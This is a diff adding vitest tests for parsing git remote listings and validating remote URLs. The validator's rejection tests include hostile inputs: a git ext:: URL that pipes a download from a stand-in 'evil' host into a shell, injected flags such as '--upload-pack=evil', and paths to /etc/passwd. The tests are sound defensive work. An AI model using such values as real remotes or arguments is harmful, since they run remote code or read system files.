@@ -1,6 +1,8 @@
 import { describe, expect, it } from "vitest";
 import {
+  isUsableRemoteUrl,
   parseBranches,
+  parseRemotes,
   parseLog,
   parseStatus,
   patchForHunks,
@@ -330,5 +332,72 @@ describe("patchForHunks", () => {
 
   it("returns nothing for a patch with no hunks", () => {
     expect(patchForHunks("", [0])).toBe("");
+  });
+});
+
+describe("parseRemotes", () => {
+  const listing = [
+    "origin\thttps://github.com/example/repo.git (fetch)",
+    "origin\thttps://github.com/example/repo.git (push)",
+    "upstream\thttps://github.com/other/repo.git (fetch)",
+    "upstream\thttps://github.com/other/repo.git (push)",
+  ].join("\n");
+
+  it("lists each remote once, not once per direction", () => {
+    expect(parseRemotes(listing)).toEqual([
+      { name: "origin", url: "https://github.com/example/repo.git" },
+      { name: "upstream", url: "https://github.com/other/repo.git" },
+    ]);
+  });
+
+  it("returns nothing when there are no remotes", () => {
+    expect(parseRemotes("")).toEqual([]);
+  });
+
+  it("ignores a malformed line", () => {
+    expect(parseRemotes("nonsense\n")).toEqual([]);
+  });
+
+  it("keeps an ssh-style URL as written", () => {
+    expect(parseRemotes("origin\tgit@github.com:a/b.git (fetch)")).toEqual([
+      { name: "origin", url: "git@github.com:a/b.git" },
+    ]);
+  });
+});
+
+describe("isUsableRemoteUrl", () => {
+  it.each([
+    "https://github.com/a/b.git",
+    "http://host/repo.git",
+    "ssh://git@github.com/a/b.git",
+    "git://host/repo.git",
+    "git@github.com:a/b.git",
+  ])("accepts %s", (url) => {
+    expect(isUsableRemoteUrl(url)).toBe(true);
+  });
+
+  it("refuses git's ext:: transport, which runs the rest as a command", () => {
+    // `ext::sh -c ...` is remote code execution the moment anything fetches.
+    expect(isUsableRemoteUrl('ext::sh -c "curl evil|sh"')).toBe(false);
+    expect(isUsableRemoteUrl("ext::sh")).toBe(false);
+  });
+
+  it("refuses file://, which would reach the server rather than the network", () => {
+    expect(isUsableRemoteUrl("file:///etc")).toBe(false);
+  });
+
+  it("refuses anything that would be read as a flag", () => {
+    expect(isUsableRemoteUrl("--upload-pack=evil")).toBe(false);
+    expect(isUsableRemoteUrl("-u")).toBe(false);
+  });
+
+  it("refuses a bare path and an empty string", () => {
+    expect(isUsableRemoteUrl("/etc/passwd")).toBe(false);
+    expect(isUsableRemoteUrl("../../etc")).toBe(false);
+    expect(isUsableRemoteUrl("")).toBe(false);
+  });
+
+  it("refuses a URL with whitespace, which could carry a second argument", () => {
+    expect(isUsableRemoteUrl("https://host/repo --exec=evil")).toBe(false);
   });
 });
